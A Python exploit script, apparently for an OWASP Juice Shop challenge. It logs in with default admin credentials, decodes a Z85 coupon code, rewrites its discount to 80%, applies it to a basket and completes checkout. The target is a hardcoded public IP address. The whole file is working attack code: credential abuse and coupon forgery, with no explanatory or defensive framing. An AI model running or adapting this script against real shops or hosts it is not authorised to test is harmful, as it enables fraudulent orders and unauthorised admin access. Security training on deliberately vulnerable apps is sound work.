import requests

Z85_CHARS = (
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
)

def z85_encode(data):
    """Encodes bytes into a Z85 string."""
    if len(data) % 4 != 0:
        raise ValueError("Length of data must be a multiple of 4")
    value = 0
    encoded = ""
    for i, byte in enumerate(data):
        value = value * 256 + byte
        if (i + 1) % 4 == 0:
            divisor = 85 ** 4
            for _ in range(5):
                encoded += Z85_CHARS[value // divisor]
                value %= divisor
                divisor //= 85
    return encoded

def z85_decode(encoded):
    """Decodes a Z85 string into bytes."""
    if len(encoded) % 5 != 0:
        raise ValueError("Length of encoded string must be a multiple of 5")
    value = 0
    decoded = bytearray()
    for i, char in enumerate(encoded):
        value = value * 85 + Z85_CHARS.index(char)
        if (i + 1) % 5 == 0:
            divisor = 256 ** 3
            for _ in range(4):
                decoded.append(value // divisor)
                value %= divisor
                divisor //= 256
    return bytes(decoded)

class JuiceShopCouponExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def login_as_admin(self, email="admin@juice-sh.op", password="admin123"):
        payload = {"email": email, "password": password}
        response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)
        if response.status_code == 200 and "authentication" in response.json():
            token = response.json()["authentication"]["token"]
            self.headers["Authorization"] = f"Bearer {token}"
            return True
        return False

    def fetch_basket(self):
        response = self.session.get(f"{self.base_url}/rest/basket/1", headers=self.headers)
        if response.status_code == 200:
            return response.json().get("data")
        return None

    def clear_basket(self, basket_data):
        if not basket_data or "Products" not in basket_data:
            return False
        for product in basket_data["Products"]:
            basket_item_id = product["BasketItem"]["id"]
            response = self.session.delete(f"{self.base_url}/api/BasketItems/{basket_item_id}", headers=self.headers)
            if response.status_code != 200:
                return False
        return True

    def add_item_to_basket(self, basket_id, product_id=1, quantity=1):
        payload = {"ProductId": product_id, "BasketId": basket_id, "quantity": quantity}
        response = self.session.post(f"{self.base_url}/api/BasketItems", json=payload, headers=self.headers)
        return response.status_code == 200

    def modify_coupon(self, encoded_coupon):
        try:
            decoded = z85_decode(encoded_coupon)
            decoded_str = decoded.decode("utf-8")
            parts = decoded_str.split("-")
            if len(parts) == 2 and parts[1].isdigit():
                parts[1] = "80"  # Set discount to 80%
                modified = "-".join(parts).encode("utf-8")
                return z85_encode(modified)
        except Exception as e:
            print(f"[ERROR] Failed to modify coupon: {e}")
        return None

    def apply_coupon(self, basket_id, coupon_code):
        response = self.session.put(f"{self.base_url}/rest/basket/{basket_id}/coupon/{coupon_code}", headers=self.headers)
        return response.status_code == 200

    def complete_order(self, basket_id):
        response = self.session.post(f"{self.base_url}/rest/basket/{basket_id}/checkout", headers=self.headers)
        return response.status_code == 200

    def run_exploit(self):
        print("[EXPLOIT] Starting coupon exploit...")

        # Étape 1 : Récupérer le panier
        basket_data = self.fetch_basket()
        if not basket_data:
            print("[EXPLOIT] Failed to fetch basket data.")
            return False

        basket_id = basket_data["id"]

        # Étape 2 : Ajouter un article au panier
        if not self.add_item_to_basket(basket_id):
            print("[EXPLOIT] Failed to add item to basket.")
            return False

        # Étape 3 : Modifier et appliquer un coupon
        original_coupon = "n<Mich7ZKp"
        modified_coupon = self.modify_coupon(original_coupon)
        if not modified_coupon:
            print("[EXPLOIT] Failed to modify coupon.")
            return False

        if not self.apply_coupon(basket_id, modified_coupon):
            print("[EXPLOIT] Failed to apply coupon.")
            return False

        # Étape 4 : Compléter la commande
        if not self.complete_order(basket_id):
            print("[EXPLOIT] Failed to complete order.")
            return False

        print("[EXPLOIT] Coupon exploit successful!")
        return True

if __name__ == "__main__":
    base_url = "http://45.76.47.218:3000"
    exploit = JuiceShopCouponExploit(base_url)
    exploit.run_exploit()
